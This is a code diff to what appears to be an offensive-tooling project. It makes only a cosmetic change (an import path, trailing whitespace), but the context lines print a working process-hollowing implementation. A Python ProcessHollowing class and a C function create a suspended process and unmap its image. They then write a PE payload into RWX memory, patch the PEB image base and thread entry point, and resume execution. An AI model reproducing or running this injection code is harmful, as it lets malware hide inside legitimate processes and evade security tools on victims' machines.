@@ -22,7 +22,7 @@ except ImportError:
         HANDLE = ctypes.c_void_p
     ctypes.wintypes = MockWintypes()
 
-from ...utils.windows_common import WindowsConstants
+from ...utils.system.windows_common import WindowsConstants
 
 logger = logging.getLogger(__name__)
 
@@ -138,12 +138,12 @@ class ProcessHollowing:
                       payload_entry_point: int = 0) -> Tuple[bool, Dict[str, Any]]:
         """
         Perform process hollowing.
-        
+
         Args:
             target_process: Target process to hollow
             payload: PE payload to inject
             payload_entry_point: Entry point offset in payload
-            
+
         Returns:
             Success status and details
         """
@@ -395,13 +395,13 @@ bool ProcessHollowing(LPSTR targetPath, LPVOID payload, DWORD payloadSize) {
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-    
+
     // Create suspended process
-    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
+    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         return false;
     }
-    
+
     // Get thread context
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
@@ -409,38 +409,38 @@ bool ProcessHollowing(LPSTR targetPath, LPVOID payload, DWORD payloadSize) {
         TerminateProcess(pi.hProcess, 1);
         return false;
     }
-    
+
     // Read PEB to get image base
     PVOID pebImageBase;
     SIZE_T bytesRead;
-    
+
     #ifdef _WIN64
-        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), 
+        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                          &pebImageBase, sizeof(PVOID), &bytesRead);
     #else
         ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                          &pebImageBase, sizeof(PVOID), &bytesRead);
     #endif
-    
+
     // Unmap original executable
     NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)
         GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
-    
+
     if (NtUnmapViewOfSection) {
         NtUnmapViewOfSection(pi.hProcess, pebImageBase);
     }
-    
+
     // Parse PE headers
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)payload + dosHeader->e_lfanew);
-    
+
     // Allocate memory for new image
     PVOID newImageBase = VirtualAllocEx(pi.hProcess,
                                        (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                        ntHeaders->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
-    
+
     if (!newImageBase) {
         // Try alternative address
         newImageBase = VirtualAllocEx(pi.hProcess, NULL,
@@ -448,16 +448,16 @@ bool ProcessHollowing(LPSTR targetPath, LPVOID payload, DWORD payloadSize) {
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
     }
-    
+
     if (!newImageBase) {
         TerminateProcess(pi.hProcess, 1);
         return false;
     }
-    
+
     // Write headers
     WriteProcessMemory(pi.hProcess, newImageBase, payload,
                       ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
-    
+
     // Write sections
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
@@ -466,7 +466,7 @@ bool ProcessHollowing(LPSTR targetPath, LPVOID payload, DWORD payloadSize) {
                           (PVOID)((LPBYTE)payload + section[i].PointerToRawData),
                           section[i].SizeOfRawData, NULL);
     }
-    
+
     // Update image base in PEB
     #ifdef _WIN64
         WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
@@ -475,25 +475,25 @@ bool ProcessHollowing(LPSTR targetPath, LPVOID payload, DWORD payloadSize) {
         WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                           &newImageBase, sizeof(PVOID), NULL);
     #endif
-    
+
     // Set new entry point
     DWORD entryPoint = (DWORD)((LPBYTE)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-    
+
     #ifdef _WIN64
         ctx.Rcx = entryPoint;
     #else
         ctx.Eax = entryPoint;
     #endif
-    
+
     SetThreadContext(pi.hThread, &ctx);
-    
+
     // Resume thread
     ResumeThread(pi.hThread);
-    
+
     // Clean up
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    
+
     return true;
 }
 
